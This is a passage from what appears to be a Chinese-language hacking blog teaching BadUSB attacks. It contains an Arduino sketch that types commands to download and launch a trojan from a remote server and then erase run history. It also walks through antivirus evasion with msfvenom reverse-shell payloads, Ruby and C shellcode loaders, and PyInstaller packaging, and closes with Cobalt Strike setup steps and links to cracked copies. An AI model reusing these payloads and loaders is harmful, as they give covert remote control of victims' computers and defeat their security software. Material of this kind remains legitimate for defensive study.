href="#所以程序如下" class="headerlink" title="所以程序如下."></a>所以程序如下.</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;Keyboard.h&gt;  </span><br><span class="line">void setup() &#123;  </span><br><span class="line">Keyboard.begin();&#x2F;&#x2F;开始键盘通讯  </span><br><span class="line">delay(10000);&#x2F;&#x2F;延时单位是ms，做测试可以调长一点方便你利用这个时间来下载程序.不然你会哭的.测试完后就可以改为1000ms了  </span><br><span class="line">Keyboard.press(KEY_LEFT_GUI);&#x2F;&#x2F;按下win键  </span><br><span class="line">delay(200);&#x2F;&#x2F;延时200ms,这里的所有延时都要根据实际情况来讲，太短有可能使程序运行失败   </span><br><span class="line">Keyboard.press(&#39;r&#39;);&#x2F;&#x2F;按下r键     </span><br><span class="line">delay(700);&#x2F;&#x2F;延时700ms    </span><br><span class="line">Keyboard.release(KEY_LEFT_GUI);&#x2F;&#x2F;松开win键   </span><br><span class="line">Keyboard.release(&#39;r&#39;);&#x2F;&#x2F;松开r键    </span><br><span class="line">Keyboard.press(KEY_CAPS_LOCK);&#x2F;&#x2F;按下大写键    </span><br><span class="line">Keyboard.release(KEY_CAPS_LOCK);&#x2F;&#x2F;松开大写键    </span><br><span class="line">delay(600);&#x2F;&#x2F;延时700ms    </span><br><span class="line">Keyboard.println(&quot;cmd.exe &#x2F;T:01 &#x2F;K mode CON: COLS&#x3D;16 LINES&#x3D;1&quot;);&#x2F;&#x2F;输入创建最小的CMD的程序  </span><br><span class="line">delay(500);&#x2F;&#x2F;延时500ms   </span><br><span class="line">Keyboard.press(KEY_RETURN);&#x2F;&#x2F;按下回车    </span><br><span class="line">Keyboard.release(KEY_RETURN);&#x2F;&#x2F;松开回车  </span><br><span class="line">delay(300);&#x2F;&#x2F;延时300ms  </span><br><span class="line">Keyboard.println(&quot;powershell&quot;);&#x2F;&#x2F;输入Powershell进入powershell  </span><br><span class="line">delay(300);&#x2F;&#x2F;延时300ms  </span><br><span class="line">Keyboard.press(KEY_RETURN);&#x2F;&#x2F;按下回车    </span><br><span class="line">Keyboard.release(KEY_RETURN);&#x2F;&#x2F;松开回车  </span><br><span class="line">delay(700);&#x2F;&#x2F;延时700ms   </span><br><span class="line">Keyboard.press(KEY_CAPS_LOCK);&#x2F;&#x2F;按下大写键    </span><br><span class="line">Keyboard.release(KEY_CAPS_LOCK);&#x2F;&#x2F;松开大写键  </span><br><span class="line">delay(700);&#x2F;&#x2F;延时700ms  </span><br><span class="line">Keyboard.println(&quot;powershell (new-object System.Net.WebClient).DownloadFile( &#39;xxx.xxx.xxx.xxx\1.exe&#39;,&#39;D:\\1.exe&#39;)&quot;);   </span><br><span class="line">&#x2F;&#x2F;上面这条语句是利用powershell下载木马的语句，按照我的标注来就行了，1.exe是你自己木马的名字  </span><br><span class="line">Keyboard.press(KEY_RETURN);&#x2F;&#x2F;按下回车  </span><br><span class="line">Keyboard.release(KEY_RETURN);&#x2F;&#x2F;松开回车  </span><br><span class="line">Keyboard.println(&quot;START D:\\1.exe&quot;);&#x2F;&#x2F;执行你下载的文件  </span><br><span class="line">delay(300);&#x2F;&#x2F;延时300ms  </span><br><span class="line">Keyboard.press(KEY_RETURN);&#x2F;&#x2F;按下回车   </span><br><span class="line">Keyboard.release(KEY_RETURN);&#x2F;&#x2F;松开回车  </span><br><span class="line">delay(200);&#x2F;&#x2F;延时200ms  </span><br><span class="line">Keyboard.println(&quot;exit&quot;);&#x2F;&#x2F;模拟输入exit来退出Powershell    </span><br><span class="line">delay(200);&#x2F;&#x2F;延时200ms   </span><br><span class="line">Keyboard.press(KEY_RETURN);&#x2F;&#x2F;按下回车</span><br><span class="line">delay(300);&#x2F;&#x2F;延时300ms</span><br><span class="line">Keyboard.println(&quot;reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU &#x2F;f&quot;); &#x2F;&#x2F;利用注册表清除开始--运行的记录（打扫战场）</span><br><span class="line">delay(300);&#x2F;&#x2F;延时300ms  </span><br><span class="line">Keyboard.press(KEY_RETURN);&#x2F;&#x2F;按下回车   </span><br><span class="line">Keyboard.release(KEY_RETURN);&#x2F;&#x2F;松开回车  </span><br><span class="line">delay(200);&#x2F;&#x2F;延时200ms</span><br><span class="line">Keyboard.println(&quot;exit&quot;);&#x2F;&#x2F;模拟输入exit来退出CMD    </span><br><span class="line">delay(200);&#x2F;&#x2F;延时200ms   </span><br><span class="line">Keyboard.press(KEY_RETURN);&#x2F;&#x2F;按下回车    </span><br><span class="line">Keyboard.release(KEY_RETURN);&#x2F;&#x2F;松开回车    </span><br><span class="line">delay(200);&#x2F;&#x2F;延时200ms    </span><br><span class="line">Keyboard.end();&#x2F;&#x2F;结束键盘通讯   </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">void loop()&#x2F;&#x2F;循环  </span><br><span class="line">&#123;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="然后再像之前教的一样烧录上去就OK啦"><a href="#然后再像之前教的一样烧录上去就OK啦" class="headerlink" title="然后再像之前教的一样烧录上去就OK啦"></a>然后再像之前教的一样烧录上去就OK啦</h3><p>Question2：啥?你讲我基础教程做的太差,一开杀软就拦截?<br>Answer：对于现在杀毒软件拦截的问题，作者有两种思路，如下  </p><ol><li>利用badusb的特性去模拟用户输入，关闭杀软，这个是可以实现的，不过需要图像识别来实现。思路大概是通过图像识别来匹配相应杀软的图标，并将每一种杀软对应一种鼠标模拟关闭方式  </li><li>第二种就比简单粗暴了（虽然好像第一种更粗暴）通过对我们的MSF木马进行免杀处理，免杀是我们现在远控常用套路，现在的问题是你的免杀方式在变，杀软也在不断更新，所以这种方式并不能从根源上避免杀毒软件带来的麻烦.<br>而我们在这就使用免杀的方法来给大家讲讲.<h1 id="MSF免杀部分"><a href="#MSF免杀部分" class="headerlink" title="MSF免杀部分."></a>MSF免杀部分.</h1>免杀也就是绕过我们的杀毒软件，而我们的免杀有很多方法，常用的方法有改特征码，加入花指令，更改偏移量，反复编码等方式. 其实都不如直接找个安全的不会让靶机生疑的软件捆绑上去是成功率比较高的<br>MSF生成的木马现在基本上的杀毒软件都可以拦截，我这边测试了一下VT(<a href="http://www.virscan.org和https//www.virustotal.com/gui/)%E6%88%91%E9%83%BD%E8%BF%9B%E8%A1%8C%E4%BA%86%E6%B5%8B%E8%AF%95%EF%BC%8C%E7%BB%93%E6%9E%9C%E5%A6%82%E4%B8%8B%E5%9B%BE">www.virscan.org和https://www.virustotal.com/gui/)我都进行了测试，结果如下图</a><br><img src="https://i.loli.net/2020/03/14/5ZX2iRxTCKhyp3f.png" alt="QQ截图20200314193205.png"><br><img src="https://i.loli.net/2020/03/14/bnDVY4zOpsmJair.png" alt="QQ截图20200314195500.png"><br>分别是27/49，57/72说实话挺出乎意料的（MSF都检测不出来的杀毒可以删了.），不过由于是网站检测实际情况可能比这好一些，接下来我们就可以对于我们的木马进行免杀处理.<h3 id="1-MSF自带的免杀模块（效果还行（很差））"><a href="#1-MSF自带的免杀模块（效果还行（很差））" class="headerlink" title="1.MSF自带的免杀模块（效果还行（很差））"></a>1.MSF自带的免杀模块（效果还行（很差））</h3>MSF的功能是极其强大的，渗透必备，而他在免杀方面也有很多模块支持，我们可以先利用它自己的模块来进行处理.基本（99.9%被杀）但是如果我们将其绑定之一个正常的软件上，则绕过概率更大<br>下面是基本对于MSF免杀模块的整理<h4 id="编码器（MSF自带，使用前要先打开MSF）"><a href="#编码器（MSF自带，使用前要先打开MSF）" class="headerlink" title="编码器（MSF自带，使用前要先打开MSF）"></a>编码器（MSF自带，使用前要先打开MSF）</h4>msfvenom -1 encoders//列出可用格式<br><img src="https://i.loli.net/2020/03/16/AH6xK9sBMOoLjYU.png" alt="QQ截图20200316150829.png"><br>选择windows可用的编码器<br>我这里选择如下<br><img src="https://i.loli.net/2020/03/16/ZreTx6IpBW9VdkC.png" alt="QQ截图20200316152016.png"><br>可以看到它的等级是很高的，shikata_ga_nai编码技术是多态的，也就是说每次生成的攻击载荷文件都不一样<br>然后我们可以开始生成木马，语句如下<br>msfvenom -p windows/shell_reverse_tcp 意为使用shell_reverse_tcp攻击载荷<br>LHOST=192.168.31.143 设置KaliIP地址<br>LPORT=8888  设置监听端口   </li></ol><p>-e x86/shikata_ga_nai 为使用shikata_ga_nai的编码方式对攻击载荷进行重新编码<br>-i 6  使用刚才设定的编码方式对目标进行6次编码（理论上越多越好，不过应该会有一个峰值，正常5-10次差不多）<br>-f exe 指定MSF输出格式为exe<br>-o /root/桌面/shell.exe 指定处理完毕后的文件输出路径<br>综合起来就是这样：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.31.143 LPORT&#x3D;8888 -e x86&#x2F;shikata_ga_nai -i 6 -f exe -o &#x2F;root&#x2F;桌面&#x2F;shell.exe  </span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/16/hDd75m6aRkXPNOz.png" alt="QQ截图20200316164623.png"></p><h4 id="这样我们的编码器的木马生成完成了"><a href="#这样我们的编码器的木马生成完成了" class="headerlink" title="这样我们的编码器的木马生成完成了"></a>这样我们的编码器的木马生成完成了</h4><p>我们上传到VT上看看，果然，效果真的”很好”<br><img src="https://i.loli.net/2020/03/16/26kOxp9EDdarH3S.png" alt="QQ截图20200316170509.png"><br><img src="https://i.loli.net/2020/03/16/PqV1G6I3O7vMJgK.png" alt="QQ截图20200316170459.png"><br>然后我们打开监听模块，上面有写在这就不多赘述了，也可以正常接收到反弹shell  </p><h3 id="而在本文中也将介绍通过ruby和C语言和Python进行的免杀处理，这三种方法比MSF自带的模块好太多了"><a href="#而在本文中也将介绍通过ruby和C语言和Python进行的免杀处理，这三种方法比MSF自带的模块好太多了" class="headerlink" title="而在本文中也将介绍通过ruby和C语言和Python进行的免杀处理，这三种方法比MSF自带的模块好太多了"></a>而在本文中也将介绍通过ruby和C语言和Python进行的免杀处理，这三种方法比MSF自带的模块好太多了</h3><h3 id="ruby进行免杀的话需要受攻击机有相应环境（也可以转为exe），而C和python则可以通过封装来转为exe执行"><a href="#ruby进行免杀的话需要受攻击机有相应环境（也可以转为exe），而C和python则可以通过封装来转为exe执行" class="headerlink" title="ruby进行免杀的话需要受攻击机有相应环境（也可以转为exe），而C和python则可以通过封装来转为exe执行"></a>ruby进行免杀的话需要受攻击机有相应环境（也可以转为exe），而C和python则可以通过封装来转为exe执行</h3><h2 id="2-ruby免杀-需要受攻击机有ruby环境-（效果最好VT0-59）"><a href="#2-ruby免杀-需要受攻击机有ruby环境-（效果最好VT0-59）" class="headerlink" title="2.ruby免杀(需要受攻击机有ruby环境)（效果最好VT0/59）"></a>2.ruby免杀(需要受攻击机有ruby环境)（效果最好VT0/59）</h2><ol><li>首先我们要通过msf生成基于ruby的木马（请先输入msfconsole进入msf）<br>msfvenom -p windows/x64/meterpreter/reverse_tcp  LHOST=x.x.x.x LPORT=8888 -f ruby<br>这边的x.x.x.x和8888跟上面一样，都分别替换为你kali的ip和接受的端口<br><img src="https://i.loli.net/2020/03/16/wVRQPvU5gbusYHc.png" alt="QQ截图20200316112028.png">  </li><li>将生成的木马复制下来<br><img src="https://i.loli.net/2020/03/16/pONnrkWK6HBSibw.png" alt="QQ截图20200316113308.png"><br>然后我们可以开始编写我们的shellcode了  </li><li>shell code如下  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">require &#39;fiddle&#39;  </span><br><span class="line">require &#39;fiddle&#x2F;import&#39;  </span><br><span class="line">require &#39;fiddle&#x2F;types&#39;   </span><br><span class="line">shellcode &#x3D; &quot;&quot;  </span><br><span class="line">include Fiddle   </span><br><span class="line">kernel32 &#x3D; Fiddle.dlopen(&#39;kernel32&#39;) </span><br><span class="line">ptr &#x3D; Function.new(kernel32[&#39;VirtualAlloc&#39;], [4,4,4,4], 4).call(0, shellcode.size, 0x3000, 0x40)  </span><br><span class="line">Function.new(kernel32[&#39;VirtualProtect&#39;], [4,4,4,4], 4).call(ptr, shellcode.size, 0, 0)  </span><br><span class="line">buf &#x3D; Fiddle::Pointer[shellcode]   </span><br><span class="line">Function.new(kernel32[&#39;RtlMoveMemory&#39;], [4, 4, 4],4).call(ptr, buf, shellcode.size)  </span><br><span class="line">thread &#x3D; Function.new(kernel32[&#39;CreateThread&#39;],[4,4,4,4,4,4], 4).call(0, 0, ptr, 0, 0, 0)   </span><br><span class="line">Function.new(kernel32[&#39;WaitForSingleObject&#39;], [4,4], 4).call(thread, ‐1)  </span><br></pre></td></tr></table></figure></li><li>将你上面复制的文件复制到shellcode=”这里”<br>保存文件后缀改为.rb</li><li>用cmd命令”ruby shell.rb”即可运行（Arduino 代码改动不多，就是把在powershell里输入./shell.rb改为ruby shell.rb）  </li><li>跟MSF之前写的一样，打开监听模块，这里我就不多叙述了，不会的看上面  <h2 id="3-C语言免杀"><a href="#3-C语言免杀" class="headerlink" title="3.C语言免杀"></a>3.C语言免杀</h2></li><li>我们跟用ruby免杀一样，先利用MSF生成木马（提前需要进入msf）<br>先输入msfvenom -a x86 –platform windows \<br>然后再输入指定参数-p windows/meterpreter/reverse_tcp \<br>在输入-b ‘\x00\x0b’ LHOST=192.168.31.143 LPORT=8888 -f c<br>（如果不加上反斜杠就是中止的意思）<br><img src="https://i.loli.net/2020/03/16/CzI5BJtPEH3fXnc.png" alt="QQ截图20200316130209.png"></li></ol><p>  -a 指定目标框架<br>  –plantform 指定目标系统<br>  -p 指定payload<br>  -f 指定输出格式<br>  -b指定规避的特殊字符<br>2. 将生成出来的文件复制出来，复制到相应的C语言编辑器，（DevC++/VSC）<br>并编写我们的shellcode，如下     </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;   </span><br><span class="line">#include&lt;windows.h&gt;   </span><br><span class="line">    &#x2F;&#x2F;data段可读写   </span><br><span class="line">    #pragma comment(linker, &quot;&#x2F;section:.data,RWE&quot;)     </span><br><span class="line">    &#x2F;&#x2F;不显示窗口   </span><br><span class="line">    #pragma comment(linker,&quot;&#x2F;subsystem:\&quot;windows\&quot; &#x2F;entry:\&quot;mainCRTStartup\&quot;&quot;)    </span><br><span class="line">    #pragma comment(linker, &quot;&#x2F;INCREMENTAL:NO&quot;)      </span><br><span class="line">    unsigned char shellcode[] &#x3D;   </span><br><span class="line">&quot;\xd9\xc4\xd9\x74\x24\xf4\xbb\x7a\x0e\x27\xc6\x5e\x2b\xc9\xb1&quot;   </span><br><span class="line">&quot;\x56\x31\x5e\x18\x03\x5e\x18\x83\xc6\x7e\xec\xd2\x3a\x96\x72&quot;  </span><br><span class="line">&quot;\x1c\xc3\x66\x13\x94\x26\x57\x13\xc2\x23\xc7\xa3\x80\x66\xeb&quot;     </span><br><span class="line">&quot;\x48\xc4\x92\x78\x3c\xc1\x95\xc9\x8b\x37\x9b\xca\xa0\x04\xba&quot;   </span><br><span class="line">&quot;\x48\xbb\x58\x1c\x71\x74\xad\x5d\xb6\x69\x5c\x0f\x6f\xe5\xf3&quot; </span><br><span class="line">&quot;\xa0\x04\xb3\xcf\x4b\x56\x55\x48\xaf\x2e\x54\x79\x7e\x25\x0f&quot;   </span><br><span class="line">&quot;\x59\x80\xea\x3b\xd0\x9a\xef\x06\xaa\x11\xdb\xfd\x2d\xf0\x12&quot;   </span><br><span class="line">&quot;\xfd\x82\x3d\x9b\x0c\xda\x7a\x1b\xef\xa9\x72\x58\x92\xa9\x40&quot;   </span><br><span class="line">&quot;\x23\x48\x3f\x53\x83\x1b\xe7\xbf\x32\xcf\x7e\x4b\x38\xa4\xf5&quot;  </span><br><span class="line">&quot;\x13\x5c\x3b\xd9\x2f\x58\xb0\xdc\xff\xe9\x82\xfa\xdb\xb2\x51&quot;   </span><br><span class="line">&quot;\x62\x7d\x1e\x37\x9b\x9d\xc1\xe8\x39\xd5\xef\xfd\x33\xb4\x67&quot;   </span><br><span class="line">&quot;\x31\x7e\x47\x77\x5d\x09\x34\x45\xc2\xa1\xd2\xe5\x8b\x6f\x24&quot;       </span><br><span class="line">&quot;\x7c\x9b\x8f\xfa\xc6\xcc\x71\xfb\x36\xc4\xb5\xaf\x66\x7e\x1f&quot;    </span><br><span class="line">&quot;\xd0\xed\x7e\xa0\x05\x9b\x74\x36\x66\xf3\x96\x49\x0e\x01\xa9&quot;    </span><br><span class="line">&quot;\x77\x77\x8c\x4f\x27\xd7\xde\xdf\x88\x87\x9e\x8f\x60\xc2\x11&quot;   </span><br><span class="line">&quot;\xef\x91\xed\xf8\x98\x38\x02\x54\xf0\xd4\xbb\xfd\x8a\x45\x43&quot;</span><br><span class="line">&quot;\x28\xf7\x46\xcf\xd8\x07\x08\x38\xa9\x1b\x7d\x5f\x51\xe4\x7e&quot;  </span><br><span class="line">&quot;\xca\x51\x8e\x7a\x5c\x06\x26\x81\xb9\x60\xe9\x7a\xec\xf3\xee&quot;</span><br><span class="line">&quot;\x85\x71\xc5\x85\xb0\xe7\x69\xf2\xbc\xe7\x69\x02\xeb\x6d\x69&quot;  </span><br><span class="line">&quot;\x6a\x4b\xd6\x3a\x8f\x94\xc3\x2f\x1c\x01\xec\x19\xf0\x82\x84&quot; </span><br><span class="line">&quot;\xa7\x2f\xe4\x0a\x58\x1a\x76\x4c\xa6\xd8\x51\xf5\xce\x22\xe2&quot; </span><br><span class="line">&quot;\x05\x0e\x49\xe2\x55\x66\x86\xcd\x5a\x46\x67\xc4\x32\xce\xe2&quot;     </span><br><span class="line">&quot;\x89\xf1\x6f\xf2\x83\x54\x31\xf3\x20\x4d\xc2\x8e\x49\x72\x23&quot;    </span><br><span class="line">&quot;\x6f\x40\x17\x24\x6f\x6c\x29\x19\xb9\x55\x5f\x5c\x79\xe2\x50&quot;   </span><br><span class="line">&quot;\xeb\xdc\x43\xfb\x13\x72\x93\x2e&quot;;  </span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv)  </span><br><span class="line">&#123;  </span><br><span class="line">_asm  </span><br><span class="line">&#123;  </span><br><span class="line">lea eax,shellcode  </span><br><span class="line">call eax  </span><br><span class="line">&#125;  </span><br><span class="line">returen 0;  </span><br><span class="line"> &#125;   </span><br></pre></td></tr></table></figure><ol start="3"><li>打开MSF监听.  </li><li>运行文件即可  <h2 id="4-Python免杀（可通过pyinstaller封装成exe，推荐）"><a href="#4-Python免杀（可通过pyinstaller封装成exe，推荐）" class="headerlink" title="4.Python免杀（可通过pyinstaller封装成exe，推荐）"></a>4.Python免杀（可通过pyinstaller封装成exe，推荐）</h2></li><li>打开msf，生成py木马（先进入msf）跟C语言前面生成木马的步骤差不多<br>msfvenom  -p python/meterpreter/reverse_tcp \<br>LHOST=192.168.31.134 LPORT=8888 \ （指定端口和IP）   </li></ol><p>  -f raw -o shell.py （指定生成文件名）<br>  <img src="https://i.loli.net/2020/03/16/2Um4lcdYzgkNrQS.png" alt="QQ截图20200316133347.png"><br>2. cat或vim打开shell.py文件，将里面内容复制出来<br>  <img src="https://i.loli.net/2020/03/16/1CqXh3Re4Ex6BI8.png" alt="QQ截图20200316133607.png"><br>3. 将复制的文件保存为.py后缀，并且利用pyinstaller转成exe<br>先pip install 安装pyinstaller<br>如果你出现像我这种情况，那么请你先更新pip<br><img src="https://i.loli.net/2020/03/16/ixTZ1MtNH3oKO89.png" alt="QQ截图20200316135003.png"><br>输入 python -m pip install –upgrade pip<br>更新好之后安装pyinstaller<br>打开cmd输入pip install pyinstaller以安装pyinstaller模块<br>等待安装完成，这里可能会安装的很慢，也有可能掉线，所以可以换成国内的源<br>国内的源： -i <a href="http://pypi.douban.com/simple">http://pypi.douban.com/simple</a> –trusted-host pypi.douban.com<br>4. 然后输入pyinstaller -F shell.py就可以把shell.py封装成exe文件了<br>5. 将exe文件上传至服务器并更改Arduino代码中powershell的下载位置即可  </p><h2 id="至此，免杀部分也完成了，这个免杀部分不仅仅局限于我介绍的这几种，各位小伙伴自己制作的肯定比我做的要好，你们也可以想出更多的骚操作"><a href="#至此，免杀部分也完成了，这个免杀部分不仅仅局限于我介绍的这几种，各位小伙伴自己制作的肯定比我做的要好，你们也可以想出更多的骚操作" class="headerlink" title="至此，免杀部分也完成了，这个免杀部分不仅仅局限于我介绍的这几种，各位小伙伴自己制作的肯定比我做的要好，你们也可以想出更多的骚操作."></a>至此，免杀部分也完成了，这个免杀部分不仅仅局限于我介绍的这几种，各位小伙伴自己制作的肯定比我做的要好，你们也可以想出更多的骚操作.</h2><h2 id="以上所有的免杀都不需要我们过多的修改我们的badusb程序"><a href="#以上所有的免杀都不需要我们过多的修改我们的badusb程序" class="headerlink" title="以上所有的免杀都不需要我们过多的修改我们的badusb程序"></a>以上所有的免杀都不需要我们过多的修改我们的badusb程序</h2>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
          <category> 近源渗透 </category>
          
          <category> badusb </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透 </tag>
            
            <tag> 免杀 </tag>
            
            <tag> 近源渗透 </tag>
            
            <tag> badusb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>badusb第二期</title>
      <link href="2020/11/08/badusb%E7%AC%AC%E4%BA%8C%E6%9C%9F/"/>
      <url>2020/11/08/badusb%E7%AC%AC%E4%BA%8C%E6%9C%9F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="HID攻击之Badusb-全面的带你了解Badusb五种的花样玩法"><a href="#HID攻击之Badusb-全面的带你了解Badusb五种的花样玩法" class="headerlink" title="HID攻击之Badusb(全面的带你了解Badusb五种的花样玩法.)"></a>HID攻击之Badusb(全面的带你了解Badusb五种的花样玩法.)</h1><h3 id="文章出自JoCat-QQ：1506610991-有渗透测试需求及商务合作请联系-74-x6f-x43-97-x74-87-x46-89-x40-x31-54-x33-x2e-99-x6f-109"><a href="#文章出自JoCat-QQ：1506610991-有渗透测试需求及商务合作请联系-74-x6f-x43-97-x74-87-x46-89-x40-x31-54-x33-x2e-99-x6f-109" class="headerlink" title="文章出自JoCat QQ：1506610991 有渗透测试需求及商务合作请联系&#74;&#x6f;&#x43;&#97;&#x74;&#87;&#x46;&#89;&#x40;&#x31;&#54;&#x33;&#x2e;&#99;&#x6f;&#109;"></a>文章出自JoCat QQ：1506610991 有渗透测试需求及商务合作请联系<a href="mailto:&#74;&#x6f;&#x43;&#97;&#x74;&#87;&#x46;&#89;&#x40;&#x31;&#54;&#x33;&#x2e;&#99;&#x6f;&#109;">&#74;&#x6f;&#x43;&#97;&#x74;&#87;&#x46;&#89;&#x40;&#x31;&#54;&#x33;&#x2e;&#99;&#x6f;&#109;</a></h3><h3 id="本文可能存在攻击性，请勿用于非法用途。仅用于技术交流，一切责任与本人无关，如有不足的地方希望指点"><a href="#本文可能存在攻击性，请勿用于非法用途。仅用于技术交流，一切责任与本人无关，如有不足的地方希望指点" class="headerlink" title="本文可能存在攻击性，请勿用于非法用途。仅用于技术交流，一切责任与本人无关，如有不足的地方希望指点"></a>本文可能存在攻击性，请勿用于非法用途。仅用于技术交流，一切责任与本人无关，如有不足的地方希望指点</h3><h3 id="作者博客JoCatW-github-io"><a href="#作者博客JoCatW-github-io" class="headerlink" title="作者博客JoCatW.github.io"></a>作者博客JoCatW.github.io</h3><h1 id="00x5-1利用CS辅助Bad-USB进行攻击"><a href="#00x5-1利用CS辅助Bad-USB进行攻击" class="headerlink" title="00x5.1利用CS辅助Bad USB进行攻击"></a>00x5.1利用CS辅助Bad USB进行攻击</h1><h3 id="什么是Cobalt-Strike（简称CS）"><a href="#什么是Cobalt-Strike（简称CS）" class="headerlink" title="什么是Cobalt Strike（简称CS）"></a>什么是Cobalt Strike（简称CS）</h3><p>CobatStrike是一款基于java编写的全平台多方协同后渗透攻击框架。CobaltStrike集成了端口转发、端口扫描、socket代理、提权、钓鱼、远控木马等功能。你可以把它当作是商业版渗透测试的灰鸽子远控，比市面上哪些坑蒙拐骗萌新的有后门的远控软件好多了.早期版本CobaltSrtike依赖Metasploit框架，而现在Cobalt Strike已经不再使用MSF而是作为单独的平台使用，它分为客户端(Client)与服务端(Teamserver)，服务端是一个，客户端可以有多个，团队可进行分布式协团操作。<br>本篇文章不做过多的关于CS的介绍，如果有师傅想听我做详细的介绍，那么我后面可以专门写一篇关于CS的使用与花式玩法.下载地址：链接：<a href="https://pan.baidu.com/s/19nXBgw9fpTrweXAKvEChVA">https://pan.baidu.com/s/19nXBgw9fpTrweXAKvEChVA</a><br>提取码：3m4j<br>4.0链接（J0师傅提供）  链接：<a href="https://pan.baidu.com/s/1m-EE80xb9v4TGuDECW9obg">https://pan.baidu.com/s/1m-EE80xb9v4TGuDECW9obg</a><br>提取码：a68r<br>注意，客户端和服务器的版本要一致~<br>我们首先要在Linux或Windows端配置好CS（很多论坛上都有很多大佬做了介绍.）<br>CS官网：<a href="https://www.cobaltstrike.com/">https://www.cobaltstrike.com/</a>   </p><ul><li>Cobalt Strike可以使用 AggressorScripts脚本来加强自身，使其更加丰满，能够扩展菜单 栏，视图Beacon命令行，提权脚本等  </li><li>Cobalt Strike通信配置文件是 Malleable C2 你可以修改 CS的通讯特征，Beacon payload的一些行为    </li><li>Cobalt Strike可以引用其他的通讯框架ExternalC2，ExternalC2是由Cobalt Strike提出的一套规范/框架，它允许黑客根据需要对框架提供的默认HTTP(S)/DNS/SMB C2 通信通道进行扩展。  <h2 id="1-配置CS-全程记得关闭杀软-不然就看图吧"><a href="#1-配置CS-全程记得关闭杀软-不然就看图吧" class="headerlink" title="1.配置CS(全程记得关闭杀软)不然就看图吧"></a>1.配置CS(全程记得关闭杀软)不然就看图吧</h2><img src="https://i.loli.net/2020/03/15/E9bFuysNxCwXAgl.png" alt="QQ截图20200315085501.png"><h3 id="客户端配置（linux下）"><a href="#客户端配置（linux下）" class="headerlink" title="客户端配置（linux下）"></a>客户端配置（linux下）</h3>前提：开启Cobaltstrike teamserver和运行GUI界面均需要Java环境,请先安装1.8u121的JAVA JDK,kali下安装教程如下.<h4 id="JAVA的安装（linux）"><a href="#JAVA的安装（linux）" class="headerlink" title="JAVA的安装（linux）"></a>JAVA的安装（linux）</h4></li></ul><ol><li>更新软件包列表：  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get update </span><br></pre></td></tr></table></figure></li><li>安装openjdk-8-jdk <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install openjdk-8-jdk</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2020/03/15/ZzvnH6TL5irFf8J.png" alt="QQ截图20200315015254.png"></li><li>查看java安装版本<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2020/03/15/EedfS4HJ62Ao5gr.png" alt="QQ截图20200315015127.png"><h4 id="Liunx下的启动"><a href="#Liunx下的启动" class="headerlink" title="Liunx下的启动"></a>Liunx下的启动</h4></li><li>cd切换到Cobaltstrike目录下</li><li>执行命令<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">teamserver.bat 8.8.8.8 123456</span><br><span class="line">8.8.8.8为你的服务器外网IP,123456为Coabltstrike的客户端密码</span><br></pre></td></tr></table></figure>我这边提供的CS安装包里Linux和Windows的开启方式是一样的，（如果还有开启不了的可以看看j0的关于CS的系列文章）<br>这样我们就开启好了<h3 id="Windows下启动"><a href="#Windows下启动" class="headerlink" title="Windows下启动"></a>Windows下启动</h3>前提：开启Cobaltstrike teamserver和运行GUI界面均需要Java环境，目前最好使用1.8u121的JAVA JDK比较稳定　<br>下载链接：<a href="https://www.java.com/zh_CN/">https://www.java.com/zh_CN/</a><br>直接百度JAVA，去官网下载JAVA1.8</li><li>下载keytool.exe并将其复制到Cobaltstrike文件夹下<br>下载链接:<a href="http://www.onlinedown.net/soft/614989.htm">http://www.onlinedown.net/soft/614989.htm</a>  </li><li>切换到Cobaltstrike目录执行如下命令  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Keytool.exe -keystore .&#x2F;cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias cobaltstrike -dname &quot;CN&#x3D;Major Cobalt Strike, OU&#x3D;AdvancedPenTesting, O&#x3D;cobaltstrike, L&#x3D;Somewhere, S&#x3D;Cyberspace, C&#x3D;Earth&quot;  </span><br></pre></td></tr></table></figure></li><li>执行命令<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">teamserver.bat x.x.x.x password  </span><br><span class="line">x.x.x.x为你的服务器外网IP,password为Coabltstrike的客户端密码</span><br></pre></td></tr></table></figure></li><li>双击cobaltstrike.bat，填写服务器外网IP和teamserver密码，即可登入</li></ol><h3 id="剩下的操作跟MSF同理，生成木马下载执行即可"><a href="#剩下的操作跟MSF同理，生成木马下载执行即可" class="headerlink" title="剩下的操作跟MSF同理，生成木马下载执行即可"></a>剩下的操作跟MSF同理，生成木马下载执行即可</h3><h3 id="关于CS的使用可以去看j0师傅的教程，我在此不做详细介绍，如果有需要我会后面出一期"><a href="#关于CS的使用可以去看j0师傅的教程，我在此不做详细介绍，如果有需要我会后面出一期" class="headerlink" title="关于CS的使用可以去看j0师傅的教程，我在此不做详细介绍，如果有需要我会后面出一期~"></a>关于CS的使用可以去看j0师傅的教程，我在此不做详细介绍，如果有需要我会后面出一期~</h3><h3 id="Arduino的源码也一样，只是把下载地址改为你CS生成木马的地址"><a href="#Arduino的源码也一样，只是把下载地址改为你CS生成木马的地址" class="headerlink" title="Arduino的源码也一样，只是把下载地址改为你CS生成木马的地址"></a>Arduino的源码也一样，只是把下载地址改为你CS生成木马的地址</h3><h1 